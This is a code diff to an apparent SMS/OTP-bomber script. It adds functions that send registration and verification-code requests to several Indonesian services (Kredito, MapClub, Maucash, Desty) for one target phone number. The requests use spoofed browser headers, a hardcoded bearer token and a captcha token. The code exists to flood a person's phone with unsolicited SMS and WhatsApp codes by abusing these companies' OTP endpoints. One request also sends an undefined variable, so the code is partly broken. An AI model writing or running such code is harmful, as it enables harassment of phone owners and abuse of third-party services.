@@ -250,7 +250,107 @@ def get_spm_sny():
         #otp_payload = {"otpRequestType": "verify-phone", "action": "onMountOrResend"}
         #otp_response = requests.post(otp_url, headers=otp_headers, data=json.dumps(otp_payload)).text
 #
-        pintar=requests.post("https://api.pintarnya.com/api/pk/auth/register/mobile",headers={'Host':'api.pintarnya.com','content-length':'27','sec-ch-ua':'"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"','sec-ch-ua-mobile':'?1','authorization':'Bearer undefined','user-agent':user_agent,'content-type':'application/json','accept':'application/json, text/plain, */*','platform':'web-kerja','sec-ch-ua-platform':'"Android"','origin':'https://pintarnya.com','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://pintarnya.com/','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=json.dumps({"mobile":"+62"+nomor})).text
+        headers_kredito = {
+            'Host': 'app-api.kredito.id',
+            'Connection': 'keep-alive',
+            'Content-Length': '80',
+            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
+            'Accept-Language': 'id-ID',
+            'sec-ch-ua-mobile': '?1',
+            'User-Agent': user_agent,
+            'Content-Type': 'application/json; charset=UTF-8',
+            'Accept': 'application/json, text/javascript, */*; q=0.01',
+            'LPR-BRAND': 'Kredito',
+            'LPR-PLATFORM': 'h5',
+            'sec-ch-ua-platform': '"Android"',
+            'Origin': 'https://mobile.kredito.id',
+            'Sec-Fetch-Site': 'same-site',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Dest': 'empty',
+            'Referer': 'https://mobile.kredito.id/',
+            'Accept-Encoding': 'gzip, deflate, br'
+        }
+
+        data_kredito = json.dumps({
+            "mobilePhone": nomor,
+            "event": "default_verification",
+            "sender": "jatissms"
+        })
+
+        post_kredito = requests.post("https://app-api.kredito.id/client/v1/common/verify-code/send", headers=headers_kredito, data=data_kredito).text
+#
+        url = "https://beryllium.mapclub.com/api/member/registration/sms/otp?channel=SMS"
+        headersmap = {
+            "Host": "beryllium.mapclub.com",
+            "content-length": "25",
+            "client-platform": "WEB",
+            "client-timestamp": "1702267922139",
+            "accept-language": "en-US",
+            "sec-ch-ua-mobile": "?1",
+            "authorization": "Bearer eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiI5NDgxZDJmNS03MjBjLTQwNWQtODcwYi1kNmE2OGQxYjk1ZDYiLCJleHBpcmVkIjoxNzAyMjcxNDg3NDcyLCJleHBpcmUiOjM2MDAsImV4cCI6MTcwMjI3MTQ4NywiaWF0IjoxNzAyMjY3ODg3LCJwbGF0Zm9ybSI6IldFQiJ9.D2739-INK2P6n3OHox7dxVkr7nIIlFK6PgbVBU0OOScH7k4c0768ZzU183tHOZ5Wk9HEMwb5aIsknEfBz0gbHA",
+            "user-agent": user_agent,
+            "content-type": "application/json",
+            "accept": "application/json, text/plain, */*",
+            "sec-ch-ua-platform": "\"Android\"",
+            "origin": "https://www.mapclub.com",
+            "sec-fetch-site": "same-site",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-dest": "empty",
+            "referer": "https://www.mapclub.com/",
+            "accept-encoding": "gzip, deflate, br"
+        }
+        data_club = {"account": nomor}
+        response = requests.post(url, headers=headersmap, json=data).text
+#
+        headersmau = {
+            "Host": "japi.maucash.id",
+            "accept": "application/json, text/plain, */*",
+            "x-origin": "google play",
+            "x-org-id": "1",
+            "x-product-code": "YN-MAUCASH",
+            "x-app-version": "2.4.23",
+            "x-source-id": "android",
+            "accept-encoding": "gzip",
+            "user-agent": user_agent
+        }
+        maucash = requests.get(f"https://japi.maucash.id/welab-user/api/v1/send-sms-code?mobile={nomor}&channelType=0", headers=headersmau).text
+#
+        headersdesty = {
+            "Host": "pulibic-gateway.desty.app",
+            "Connection": "keep-alive",
+            "Content-Length": "1820",
+            "local-agent": "DestyMenuSeller",
+            "sec-ch-ua": '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
+            "Original-Host": "www.desty.app",
+            "sec-ch-ua-mobile": "?1",
+            "User-Agent": user_agent,
+            "Content-Type": "application/json",
+            "Accept": "application/json, text/plain, */*",
+            "app": "Page",
+            "sec-ch-ua-platform": "Android",
+            "Origin": "https://www.desty.app",
+            "Sec-Fetch-Site": "same-site",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Dest": "empty",
+            "Referer": "https://www.desty.app/",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+        }
+        payloaddesty = {
+            "inputValue": nomor,
+            "loginType": "Phone",
+            "googleCaptcha": "03AFcWeA7le-TQTkmpasTILrespLUsrAxRgztCuoY7qAS0N03nkH9U0JBa9BbCLKrZ_AD-ldu6L9UE__uPqtXJdDflp5dkXBzuN-EmbJAkhfKVI4SOg82GxoYk1k21zCKCcUCMYeSDrrL2sJfgQ1G3t8uHBswodzF3qdaZ23YdoJKt6uKBpSdVztYEmaQNA_HbIKh5PjiNbqQRZdRMPWRVnkYriXioSikZyCugSDKie0PSKeOI5Hv94xUV1raOdt5HVLNpgUa35q_Tm6t42N3HpDx7FUuy_dMc8FKi5Inw0d2_4RKbHxH6AaqyIVyok_ZQ8JOGELuhgxvjBQ7nZyD_2fdLX57gkME2lTgdDc7CNdcLu_WFy8ak7nAhAP27i7iiqtGg5o5n0mCdNyn4wGWUNci0MU-Xpqz7j4M-mAcfuSGyT_kjkSY5hpHPvYmzjXjOOQ_zoQG07g8sgj8TdzD-y62BEdy6oxzw9xq7xIbKevRjVcPDnZ0ApH-2dv4RXCA4tNVNRy_iHDT9GM0wbwyb_Bz_uw99Y4fsTygeVcDjZapsmY9C6nPygsgaFUIVzUjTNBCqLAy5rRuiItsP3CzKIghiGhAJJLuMeL8juB3LEmiE82LDkWkAannFy4VmpYp0Pwp_C6HI9IeBKW31e05Spky3AuX4eP1CZNjJIt4dAVpdomqx0jO_CTHie49uZG1J3s6ytRGPg08Sj0x02Yc2iqvmzEaHnARVFl44yK7XjEgwuInbqVOngi3woCS3JLwcPFNMT5p5CqDe4RTiNIJ02Lztw0FFUzv5P3Tu4eqIZhWdjBE10aNnI7R-baT7qTtmDNIFjcTgBhZc_-2YkumXD_cOKxPPVQ536l24rkKQrU5VaXJQM7zkqX8rB81KMvVMf7WRCFe73N5Z-0duwrlagU09NjmTIP9wqxCWr0w2i720uZghRnqu1dH9LEv3C6dYqU0QdJXF5uX2vv1NVpLLiv2ha893EaVEBeiyNLV8osAQgco0sYebybSZ3GRHysSsjrkEfrhYJI30ak9Bg96fJcoPuFUOi1oQ3C1mWrkVRk5GuwNLF7Fyrhrls5uVYLqku5MzYj84fgtlAd9yjgig3rlsoln_au9jYK_tTlR-qcTtQwHjorNpiKkWlvdL-a3902y7MBM6scwANon1S-eGMvC8MP6IZB-sBhZdXdEFCZoKvI9iRjA9NlR3sdqGj334s14a4dppYVKuxmi-vjSqoJpfh77Vuy7ZrTiDvezDzljC6oXEHkFPYqrFDOIW_9-nT_DYCc9y-bKKPxZ_zei9ofKRqOa6yYgs0y3u4dKslUNpvJ17iHFqWbR7fCTvwuj3kWZtDbtJEPPgeG8OoqTS1-RjFchsjB5daRb9Akv-2HtfcDbD0kLpkLhk5e2OHk56norOkGXiDP0Ik-2bXNaiAfjOj95hrFp6xt_viBVxIT68FNwor4B4pB34aqx8YUKXbdEYoRLbU72Ziw2mhuVFV9Rachiuw81uLu0jZO3J292y6j9MTdaQGEss_JCyuuerwi3AIzuLDa2jzrLwC_YOJ4fawUQxi7yanN2mB4KES9Yp4J_hG5I9ypQ",
+            "address":"+62"+nomor,
+            "expire":True,
+            "language":"id",
+            "source":"Page",
+            "sendType":"WHATSAPP",
+            "app":"Page",
+            "clientType":1,
+            "isSub":False,
+            "situation":"REGISTER"
+        }
+        respondesty=requests.post("https://pulibic-gateway.desty.app/platform/user/catpcha/send", headers=headersdesty, json=payloaddesty).text
 #
         headdooit = {    "Host": "www.dooitwell.id",    "Content-Length": "36",    "Sec-Ch-UA": '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',    "Accept": "application/json, text/plain, */*",    "Content-Type": "application/json;charset=UTF-8",    "Sec-Ch-UA-Mobile": "?1",    "User-Agent":user_agent,    "Sec-Ch-UA-Platform": '"Android"',    "Origin": "https://www.dooitwell.id",    "Sec-Fetch-Site": "same-origin",    "Sec-Fetch-Mode": "cors",    "Sec-Fetch-Dest": "empty",    "Referer": "https://www.dooitwell.id/register",    "Accept-Encoding": "gzip, deflate, br",    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}
         payloaddooit = {"code": "+62", "phone": nomor}
